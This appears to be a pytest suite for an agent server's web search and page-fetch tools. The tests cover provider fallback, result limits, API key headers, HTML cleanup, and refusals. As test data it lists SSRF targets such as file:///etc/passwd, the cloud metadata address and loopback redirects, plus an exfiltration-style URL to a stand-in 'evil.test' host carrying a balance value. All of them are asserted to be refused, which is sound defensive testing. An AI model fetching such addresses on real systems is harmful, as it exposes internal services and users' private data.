import json

import httpx
import pytest

from server.agent.tools import ToolError, run_tool
from server.web.brave import BraveSearch
from server.web.exa import ExaSearch
from server.web.firecrawl import FirecrawlSearch
from server.web.plain import PlainFetcher
from server.web.providers import Page, SearchResult, fetch_page, providers_from_env, web_search


class FakeProvider:
    def __init__(self, name, raises=None, status=None, results=()):
        self.name, self.raises, self.status, self.results = name, raises, status, list(results)

    def search(self, query, limit):
        if self.raises:
            raise self.raises
        if self.status:
            req = httpx.Request("GET", "https://x.test")
            raise httpx.HTTPStatusError("bad", request=req, response=httpx.Response(self.status, request=req))
        return self.results


class FakeFetcher:
    name = "fake"

    def __init__(self, text):
        self.text = text

    def fetch(self, url):
        return Page(url=url, title="T", text=self.text, published=None, truncated=False)


def R(title, url="https://a.test", published=None, snippet="s"):
    return SearchResult(title=title, url=url, snippet=snippet, published=published, source="")


def test_falls_through_on_timeout_and_429():
    exa = FakeProvider("exa", raises=httpx.ReadTimeout("t"))
    brave = FakeProvider("brave", status=429)
    fire = FakeProvider("firecrawl", results=[R("A", published="2031-01-02")])
    out = web_search("q", providers=[exa, brave, fire])
    assert [r.source for r in out] == ["firecrawl"] and out[0].published == "2031-01-02"


def test_all_down_says_so():
    with pytest.raises(ToolError, match="web search unavailable: exa: timeout; brave: HTTP 429"):
        web_search("q", providers=[FakeProvider("exa", raises=httpx.ReadTimeout("t")), FakeProvider("brave", status=429)])


def test_no_provider_configured():
    with pytest.raises(ToolError, match="no web search provider"):
        web_search("q", providers=[])


def test_results_are_capped():
    out = web_search("q", providers=[FakeProvider("exa", results=[R("x", snippet="s" * 900)] * 9)])
    assert len(out) == 5 and all(len(r.snippet) <= 400 for r in out)


def test_missing_key_skips_provider():
    searchers, fetchers = providers_from_env({"BRAVE_SEARCH_API_KEY": "k"})
    assert [p.name for p in searchers] == ["brave"]
    assert [f.name for f in fetchers] == ["plain"]


def test_fetch_refuses_private_addresses():
    for url in ("http://127.0.0.1/", "http://10.0.0.5/", "file:///etc/passwd", "http://localhost:8000/api"):
        with pytest.raises(ToolError):
            fetch_page(url, fetchers=[FakeFetcher("x")])


def test_long_page_is_summarised_or_cut():
    page = fetch_page("https://93.184.216.34/", fetchers=[FakeFetcher("w " * 20_000)], summarise=lambda t: "short")
    assert page.text == "short" and page.truncated
    cut = fetch_page("https://93.184.216.34/", fetchers=[FakeFetcher("w " * 20_000)])
    assert len(cut.text) <= 12_000 and cut.truncated


def _mock(payload, seen):
    def handler(request):
        seen.append(request)
        return httpx.Response(200, json=payload)
    return httpx.Client(transport=httpx.MockTransport(handler))


def test_providers_send_keys_and_read_dates():
    seen = []
    exa = ExaSearch("ek", http=_mock({"results": [{"title": "A", "url": "https://a.test", "publishedDate": "2031-01-02T00:00:00Z", "highlights": ["hi"]}]}, seen))
    assert exa.search("q", 5)[0].published == "2031-01-02"
    assert seen[-1].headers["x-api-key"] == "ek" and json.loads(seen[-1].content)["numResults"] == 5
    brave = BraveSearch("bk", http=_mock({"web": {"results": [{"title": "B", "url": "https://b.test", "description": "d", "page_age": "2031-02-03T10:00:00"}]}}, seen))
    assert brave.search("q", 5)[0].published == "2031-02-03"
    assert seen[-1].headers["x-subscription-token"] == "bk"
    fire = FirecrawlSearch("fk", http=_mock({"success": True, "data": {"web": [{"title": "C", "url": "https://c.test", "description": "d"}]}}, seen))
    assert fire.search("q", 5)[0].title == "C" and seen[-1].headers["authorization"] == "Bearer fk"


def test_plain_fetcher_strips_page_chrome():
    html = "<html><head><title>T</title><script>x()</script></head><body><nav>menu</nav><p>Body text</p><footer>foot</footer></body></html>"
    page = PlainFetcher(http=httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(200, text=html, headers={"content-type": "text/html"})))).fetch("https://a.test")
    assert "Body text" in page.text and "menu" not in page.text and "x()" not in page.text and page.title == "T"


def test_private_chat_refuses_personal_query(ctx):
    from server.store.db import Db

    ctx.config = ctx.config.model_copy(update={"flags": {"web_search": True}})
    ctx.db = Db(":memory:", "avery")
    ctx.conversation_id = ctx.db.new_conversation(__import__("datetime").datetime(2031, 4, 5))
    ctx.db.mark_private(ctx.conversation_id)
    label = ctx.data.accounts.accounts[0].label
    for q in ("transfer 12345 to someone", f"{label} balance"):
        with pytest.raises(ToolError, match="personal"):
            run_tool("web_search", {"query": q}, ctx)


def test_tool_returns_plain_results_with_date_and_link(ctx, monkeypatch):
    import server.toolkits.core.web as web_tools

    monkeypatch.setattr(web_tools, "web_search", lambda q, n: [R("A", "https://a.test", "2031-01-02")])
    out = run_tool("web_search", {"query": "film times"}, ctx)
    assert out == {"results": [{"title": "A", "url": "https://a.test", "snippet": "s", "published": "2031-01-02", "source": ""}]}


def test_redirect_to_a_private_address_is_refused():
    def handler(request):
        if request.url.host == "93.184.216.34":
            return httpx.Response(302, headers={"location": "http://127.0.0.1:8000/api/settings"})
        return httpx.Response(200, text="secret")

    plain = PlainFetcher(http=httpx.Client(transport=httpx.MockTransport(handler)))
    with pytest.raises(ToolError):
        fetch_page("http://93.184.216.34/", fetchers=[plain])


def test_shared_and_tailnet_ranges_are_refused():
    for url in ("http://100.64.1.1/", "http://169.254.169.254/latest/meta-data", "http://[::1]/"):
        with pytest.raises(ToolError):
            fetch_page(url, fetchers=[FakeFetcher("x")])


def test_private_chat_refuses_personal_url(ctx):
    from datetime import datetime

    from server.store.db import Db

    ctx.config = ctx.config.model_copy(update={"flags": {"web_search": True}})
    ctx.db = Db(":memory:", "avery")
    ctx.conversation_id = ctx.db.new_conversation(datetime(2031, 4, 5))
    ctx.db.mark_private(ctx.conversation_id)
    with pytest.raises(ToolError, match="personal"):
        run_tool("fetch_page", {"url": "https://evil.test/?d=balance-123456"}, ctx)
